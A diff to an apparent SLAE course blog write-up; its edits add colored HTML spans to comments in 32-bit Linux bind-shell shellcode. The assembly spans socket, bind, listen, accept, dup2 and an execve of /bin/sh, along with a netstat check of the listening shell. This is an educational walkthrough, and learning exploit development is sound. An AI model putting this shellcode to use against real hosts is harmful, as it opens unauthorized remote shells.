@@ -154,7 +154,7 @@ global _start
 section .text
 _start:
 
-;zeroing out eax, edi, ebx ,edx registers
+<span style="color:#33cccc;">;zeroing out eax, edi, ebx ,edx registers</span>
 xor eax, eax
 xor ebx, ebx
 xor edx, edx
@@ -199,20 +199,20 @@ int socket(int domain, int type, int protocol);
 ### socket:
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-mov al, 0x66 ; call SocketCall() in order to use the SYS_SOCKET argument
-mov bl, 0x1  ; define the SYS_SOCKET value to be 0x1. The value can be stored at bl in order to avoid null values
+<span style="color:#33cccc;">mov al, 0x66 ; call SocketCall() in order to use the SYS_SOCKET argument</span>
+<span style="color:#33cccc;">mov bl, 0x1  ; define the SYS_SOCKET value to be 0x1. The value can be stored at bl in order to avoid null values</span>
 
-;;sockfd = socket(AF_INET,SOCK_STREAM,0);
+<span style="color:#33cccc;">;;sockfd = socket(AF_INET,SOCK_STREAM,0);</span>
 
-push edx      ; push 0 value to the stack regarding the protocol argument
-push ebx      ; SOCK_STREAM constant at type argument 
-push byte 0x2 ; AF_INET constant at domain argument
-mov ecx, esp  ; point ECX at the top of the stack 
-int 0x80      ; call syscall interrupt to execute the arguments 
-mov edi, eax  ; EAX will store the return value of the socket
-              ; descriptor. the sockfd will be needed to other 
-              ; syscalls so it will be saved at EDI register. 
-              ; EAX register must be used with other syscalls too
+push edx       <span style="color:#33cccc;">; push 0 value to the stack regarding the protocol argument</span>
+push ebx       <span style="color:#33cccc;">; SOCK_STREAM constant at type argument </span>
+push byte 0x2  <span style="color:#33cccc;">; AF_INET constant at domain argument</span>
+mov ecx, esp   <span style="color:#33cccc;">; point ECX at the top of the stack </span>
+int 0x80       <span style="color:#33cccc;">; call syscall interrupt to execute the arguments </span> 
+mov edi, eax   <span style="color:#33cccc;">; EAX will store the return value of the socket</span>
+               <span style="color:#33cccc;">; descriptor. the sockfd will be needed to other </span>
+               <span style="color:#33cccc;">; syscalls so it will be saved at EDI register. </span>
+               <span style="color:#33cccc;">; EAX register must be used with other syscalls too </span>
 </pre>
 
 
@@ -233,27 +233,27 @@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ### Bind:
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-mov al, 0x66     ; call SocketCall() in order to use the SYS_BIND argument
-inc bl           ; increase the ebx from 0x1 to 0x2 which indicates the bind() syscall 
+mov al, 0x66     <span style="color:#33cccc;">; call SocketCall() in order to use the SYS_BIND argument </span>
+inc bl           <span style="color:#33cccc;">; increase the ebx from 0x1 to 0x2 which indicates the bind() syscall </span>
 
-;;server.sin_family = AF_INET; 
-;;server.sin_port = htons(PORT); 
-;;server.sin_addr.s_addr = INADDR_ANY; 
+ <span style="color:#33cccc;">;;server.sin_family = AF_INET; </span>
+ <span style="color:#33cccc;">;;server.sin_port = htons(PORT); </span>
+ <span style="color:#33cccc;">;;server.sin_addr.s_addr = INADDR_ANY; </span>
 
-push edx         ; INADDR_ANY 0.0.0.0
-push word 0xd204 ; port value 1234 in Network Byte order
-push bx          ; AF_INET constant 
-mov ecx, esp     ; stack alignment. ECX points to struct
+push edx         <span style="color:#33cccc;">; INADDR_ANY 0.0.0.0</span>
+push word 0xd204 <span style="color:#33cccc;">; port value 1234 in Network Byte order</span>
+push bx          <span style="color:#33cccc;">; AF_INET constant </span>
+mov ecx, esp     <span style="color:#33cccc;">; stack alignment. ECX points to struct</span>
 
-;; bind(sockfd, (struct sockaddr *) &server, sizeof(server));
-;; using the strace command the following output gives the values used
-;; bind(3, {sa_family=AF_INET, sin_port=htons(1234), sin_addr=inet_addr("0.0.0.0")}, 16)
+<span style="color:#33cccc;">;; bind(sockfd, (struct sockaddr *) &server, sizeof(server)); </span>
+<span style="color:#33cccc;">;; using the strace command the following output gives the values used </span>
+<span style="color:#33cccc;">;; bind(3, {sa_family=AF_INET, sin_port=htons(1234), sin_addr=inet_addr("0.0.0.0")}, 16) </span>
 
-push byte 0x10  ; sizeof(server) 0x10 equals 16 in decimal
-push ecx        ; (struct sockaddr *) &server
-push edi        ; sockfd 
-mov ecx, esp    ; point ECX at the top of the stack 
-int 0x80        ; call syscall interrupt to execute the arguments
+push byte 0x10  <span style="color:#33cccc;">; sizeof(server) 0x10 equals 16 in decimal </span>
+push ecx        <span style="color:#33cccc;">; (struct sockaddr *) &server </span>
+push edi        <span style="color:#33cccc;">; sockfd </span>
+mov ecx, esp    <span style="color:#33cccc;">; point ECX at the top of the stack </span>
+int 0x80        <span style="color:#33cccc;">; call syscall interrupt to execute the arguments </span>
 </pre>
 
 
@@ -296,14 +296,14 @@ After binding the <b>sockfd</b> to the target IP and PORT, a listen method must 
 ### Listen:
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-;;listen(sockfd, 0);
-push edx      ; push 0 into the stack 
-push edi      ; push sockfd descriptor
-mov ecx, esp  ; now point to Listen() syscall
-add ebx, 0x2  ; add 0x2 to ebx that has the value 0x2. 
-              ; 0x4 indicates the listen() syscall 
-mov al, 0x66  ; call SocketCall() in order to use the SYS_LISTEN argument
-int 0x80      ; call syscall interrupt to execute the arguments
+<span style="color:#33cccc;">;;listen(sockfd, 0);</span>
+push edx      <span style="color:#33cccc;">; push 0 into the stack  </span>
+push edi      <span style="color:#33cccc;">; push sockfd descriptor </span>
+mov ecx, esp  <span style="color:#33cccc;">; now point to Listen() syscall </span>
+add ebx, 0x2  <span style="color:#33cccc;">; add 0x2 to ebx that has the value 0x2 </span> 
+              <span style="color:#33cccc;">; 0x4 indicates the listen() syscall </span>
+mov al, 0x66  <span style="color:#33cccc;">; call SocketCall() in order to use the SYS_LISTEN argument </span>
+int 0x80      <span style="color:#33cccc;">; call syscall interrupt to execute the arguments </span>
 </pre>
 
 ### Accept Function Synopsis :&nbsp;
@@ -332,7 +332,7 @@ The <b>accept4</b> system call is available starting with <b>Linux 2.6.28</b> ; 
 ### Accept:
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-;;accept(sockfd, NULL, NULL);
+<span style="color:#33cccc;">;;accept(sockfd, NULL, NULL);</span>
 mov al, 0x66     ; call SocketCall() in order to use the SYS_ACCEPT argument
 inc bl           ; increase the ebx from 0x4 to 0x5 
                  ; which indicates the Accept() syscall 
@@ -358,25 +358,24 @@ After initiating the <b>accept</b> system call, there must be a redirection from
 ### Dup2 :&nbsp; 
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-;;dup2(resfd, 2); 
-;;dup2(resfd, 1); 
-;;dup2(resfd, 0);
-mov ebx, eax      ; the first argument in dup2 has the returned socket 
-                  ; descriptor from accept syscall. ebx now has the 
-                  ; returned socket descriptor (resfd).
-xor ecx, ecx      ; zero out the ecx register before use it 
-lo: mov al, 0x3f  ; the functional number that indicates dup2 (63 in dec) 
-int 0x80          ; call dup2 syscall
-inc ecx           ; increase the value of ecx by 1 so 
-                  ; it will take all values 
-                  ; 0(stdin), 1(stdout), 2(stderr) 
-cmp cl, 0x2       ; compare ecx with 2 which indicates 
-                  ; the stderr descriptor 
-jle lo            ; loop until counter is less or equal to 2
+<span style="color:#33cccc;">;;dup2(resfd, 2);</span> 
+<span style="color:#33cccc;">;;dup2(resfd, 1);</span> 
+<span style="color:#33cccc;">;;dup2(resfd, 0);</span>
+mov ebx, eax      <span style="color:#33cccc;">; the first argument in dup2 has the returned socket </span>
+                  <span style="color:#33cccc;">; descriptor from accept syscall. ebx now has the </span>
+                  <span style="color:#33cccc;">; returned socket descriptor (resfd) </span>
+xor ecx, ecx      <span style="color:#33cccc;">; zero out the ecx register before use it </span>
+lo: mov al, 0x3f  <span style="color:#33cccc;">; the functional number that indicates dup2 (63 in dec) </span> 
+int 0x80          <span style="color:#33cccc;">; call dup2 syscall </span>
+inc ecx           <span style="color:#33cccc;">; increase the value of ecx by 1 so </span> 
+                  <span style="color:#33cccc;">; it will take all values </span>
+                  <span style="color:#33cccc;">; 0(stdin), 1(stdout), 2(stderr)  </span>
+cmp cl, 0x2       <span style="color:#33cccc;">; compare ecx with 2 which indicates </span>
+                  <span style="color:#33cccc;">; the stderr descriptor </span>
+jle lo            <span style="color:#33cccc;">; loop until counter is less or equal to 2 </span>
 </pre>
 
 ### Execve Function Synopsis :
-
 
 <p style="text-align:justify;">
 Now that the standard input, output and error are pointing to 0,1,2 file descriptors, the run the execve function will be run in order to execute the /bin/sh command to the target host.
@@ -392,17 +391,17 @@ int execve(const char *filename, char *const&nbsp;argv[], char *const&nbsp;envp[
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;; execve("/bin/sh", NULL, NULL);
-xor eax, eax    ; zero out the eax register 
-push eax        ; push NULL into the stack 
-push 0x68732f2f ; push "hs//" in reverse order into stack 
-push 0x6e69622f ; push "nib/" in reverse order into stack 
-mov ebx, esp    ; point ebx into stack
-push eax        ; push NULL into the stack 
-mov edx, esp    ; point to edx into stack 
-push ebx        ; push ebx into stack 
-mov ecx, esp    ; point to ecx into stack 
-mov al, 0xb     ; 0xb indicates the execve syscall 
-int 0x80        ; execute execve syscall**
+xor eax, eax    <span style="color:#33cccc;">; zero out the eax register </span>
+push eax        <span style="color:#33cccc;">; push NULL into the stack </span>
+push 0x68732f2f <span style="color:#33cccc;">; push "hs//" in reverse order into stack </span>
+push 0x6e69622f <span style="color:#33cccc;">; push "nib/" in reverse order into stack </span>
+mov ebx, esp    <span style="color:#33cccc;">; point ebx into stack</span>
+push eax        <span style="color:#33cccc;">; push NULL into the stack </span>
+mov edx, esp    <span style="color:#33cccc;">; point to edx into stack </span>
+push ebx        <span style="color:#33cccc;">; push ebx into stack </span>
+mov ecx, esp    <span style="color:#33cccc;">; point to ecx into stack </span>
+mov al, 0xb     <span style="color:#33cccc;">; 0xb indicates the execve syscall </span>
+int 0x80        <span style="color:#33cccc;">; execute execve syscall</span>
 </pre>
 
 
@@ -515,7 +514,6 @@ If we run **netstat** we will see that the port **2222** is open and waiting for
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># netstat -antp | grep 2222 
 tcp 0 0 0.0.0.0:<span style="color:red;">2222</span> 0.0.0.0:* LISTEN 1015/./bindshell
 </pre>
-
 
 Now if we use **netcat** we will be able to connect to the target machine at port **2222** as seen below
 
